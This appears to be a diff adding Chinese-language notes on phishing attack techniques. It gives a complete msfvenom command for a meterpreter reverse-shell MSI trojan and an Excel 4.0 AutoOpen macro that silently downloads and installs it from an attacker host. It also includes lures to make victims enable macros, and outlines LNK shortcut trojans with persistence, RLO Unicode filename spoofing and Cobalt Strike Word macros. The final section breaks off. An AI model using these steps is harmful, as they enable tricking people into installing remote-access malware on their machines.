@@ -1,0 +1,34 @@
+office/wps不行
+1.excel钓鱼攻击（offic系列）
+msi静默安装木马
+（1）生成木马并监听端口
+msfvenom -platform windows -a x86 -p windows/meterpreter/reverse_tcp lhost=192.168.152.130
+lport=4444 -f msi > hack.msi
+放置在www网站目录下并可远程下载
+apache2 -k start
+systemctl start apache2
+(启动apache进程，使网站可访问）
+
+（2）对excl修改
+添加宏页面,并在首格加入远程执行命令
+=EXEC("msiexec /q /i http://192.168.152.130/hack.msi")
+=HALT()
+第一列名AutoOpen并回车
+隐藏宏页面，右击，保存启用宏的工作簿，诱导用户启用宏（如动态文档、数据不完整）
+
+2.lnk快捷方式钓鱼
+（1）生成powershell的木马命令
+（2）C:\Windows\System32\WindowsPowerShell\v1.0\木马命令
+（3）修改图标诱导点击
+系统图标库--%SystemRoot%\System32\shell32.dll
+(4)对服务进行设置持久化
+
+3.unicode字符钓鱼
+（Unicode字符伪装）
+修改文件名来隐藏后缀
+a.mp3.exe--a.exe.mp3（反着写）--在a后面(插入Unicode字符RLO，exe.mp3)aexe.mp3---(真实名字）a3pm.exe
+
+4.word宏钓鱼
+(1）cs--Attack--Packages--MS office Macro(宏）
+(2)copy--txt（存储）
+(3)新建word--视图--查看宏--
